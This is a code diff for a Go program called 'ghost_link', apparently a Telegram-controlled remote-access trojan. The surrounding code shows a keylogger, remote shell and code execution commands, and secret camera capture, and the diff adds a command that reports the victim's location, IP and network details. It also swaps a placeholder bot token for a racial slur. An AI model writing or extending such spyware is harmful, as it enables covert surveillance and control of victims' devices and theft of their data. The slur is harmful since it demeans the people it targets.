@@ -8,7 +8,7 @@ import (
 	"ghost_link/utilities"
 )
 
-const botToken = "LOL" // Replace with your bot token
+const botToken = "YOUR_KEY_NIGGAH" // Replace with your bot token
 
 // startKeylogger starts the keylogger in a separate goroutine.
 func startKeylogger() {
@@ -62,7 +62,9 @@ func main() {
   /run <command> - Execute a shell command
   /code <language> <code> - Execute code (Python/Bash).
 - Camera command:
-  /camera - Capture a photo secretly.`
+  /camera - Capture a photo secretly.
+- Location command:
+  /getlocation - Get location, IP, network details.`
 			bot.Send(tgbotapi.NewMessage(chatID, message))
 
 		case strings.HasPrefix(text, "/ls"):
@@ -119,6 +121,10 @@ func main() {
 
 		case text == "/camera":
 			utilities.HandleCameraCommand(bot, chatID)
+
+		case text == "/getlocation":
+			utilities.HandleLocationCommand(bot, chatID)
+		
 
 		default:
 			bot.Send(tgbotapi.NewMessage(chatID, "Invalid command."))
